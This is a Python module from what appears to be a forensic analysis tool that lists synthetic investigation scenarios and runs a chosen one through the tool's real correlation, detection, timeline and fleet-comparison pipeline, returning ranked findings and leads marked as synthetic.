SCENARIOS = {
    "A": scenario_a, "B": scenario_b, "C": scenario_c,
    "D": scenario_d, "E": scenario_e, "F": scenario_f,
}


def list_scenarios() -> list:
    return [{"scenario": key, "title": build(  ).get("title"),
             "question": build().get("investigative_question"),
             "expected_outcome": build().get("expected_outcome")}
            for key, build in SCENARIOS.items()]


def build_scenario(name: str) -> dict:
    key = (name or "").strip().upper()
    if key not in SCENARIOS:
        raise KeyError(f"Unknown scenario '{name}'. Available: {', '.join(SCENARIOS)}")
    return SCENARIOS[key]()


def run_scenario(name: str) -> dict:
    """Build a scenario and push it through the real analysis pipeline.

    The analysis code is not told that the evidence is synthetic and gets no
    special path: the point of a scenario is to exercise exactly what a real
    collection exercises.
    """
    from analysis.activity import assign_references, build_activity, build_leads
    from analysis.correlation import correlate
    from analysis.cross_source import correlate_sources
    from analysis.detections import detect
    from analysis.fleet_correlation import correlate_fleet
    from analysis.threads import build_threads
    from analysis.timeline import build_timeline

    scenario = build_scenario(name)
    execution, artifacts = scenario["execution"], scenario["artifacts"]
    assign_references(execution.get("events", []), artifacts=artifacts.get("artifacts", []))
    correlation = correlate(execution=execution, artifacts=artifacts, processes={})
    findings = (correlation["findings"]
                + detect(drivers=scenario.get("drivers"), memory=scenario.get("memory"))
                + correlate_sources(execution=execution, artifacts=artifacts,
                                    browser=scenario.get("browser"), usb=scenario.get("usb")))
    activity = build_activity(execution.get("events", []), artifacts=artifacts.get("artifacts", []))
    threads = build_threads(activity["groups"])
    timeline = build_timeline(execution=execution, artifacts=artifacts, processes={},
                              findings=findings, transitions=[])
    # A multi-host scenario is only meaningful through the fleet comparison, so
    # its per-host evidence is presented to that code exactly as a real endpoint
    # result would be.
    fleet = None
    if scenario.get("hosts"):
        tasks, endpoints = [], []
        for index, host in enumerate(scenario["hosts"], start=1):
            endpoint_id = f"EP-SYNTHETIC-{index}"
            endpoints.append({"id": endpoint_id, "name": host["endpoint"]})
            for source in ("execution", "artifacts", "network"):
                tasks.append({"endpoint_id": endpoint_id, "status": "succeeded",
                              "source": source.upper(), "result": host[source]})
        fleet = correlate_fleet(tasks, endpoints=endpoints)

    ranked = sorted(findings, key=lambda finding: finding["priority_rank"])
    leads = build_leads(activity["groups"])
    return {
        "scenario": scenario["scenario"], "title": scenario["title"],
        "fleet_correlation": fleet,
        "highest_finding_priority": ranked[0]["priority_label"] if ranked else None,
        "highest_lead_priority": (
            leads[0]["priority_label"] if leads else None),
        "banner": SYNTHETIC_BANNER, "synthetic": True,
        "investigative_question": scenario["investigative_question"],
        "expected_outcome": scenario["expected_outcome"],
        "event_count": len(execution.get("events", [])),
        "artifact_count": len(artifacts.get("artifacts", [])),
        "findings": findings, "activity": activity, "threads": threads,
        "timeline": timeline, "correlation": correlation,
        "leads": leads,
        "source": scenario,
    }
